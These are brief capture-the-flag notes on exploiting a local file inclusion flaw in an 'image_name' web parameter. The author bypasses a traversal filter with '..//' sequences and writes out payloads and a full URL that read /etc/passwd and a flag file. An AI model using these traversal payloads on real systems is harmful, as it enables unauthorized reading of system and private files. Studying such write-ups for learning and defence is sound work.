after trying multiple methods, in inspect we located a file
and it tells us about LFI vulnerability in "image_name"
once we go back to the source file, we find out that the vulnerability is avoided 
so we try using "//" instead of "/" 
and with this we understand that the LFI vulnerability works
so now we try finding the flag 
image_name=..//..//..//etc/passwd
image_name=..//tmp/flag


http://35.246.152.131:31460/local?image_name=..//..//..//etc/passwd

local?image_name=..//tmp/flag
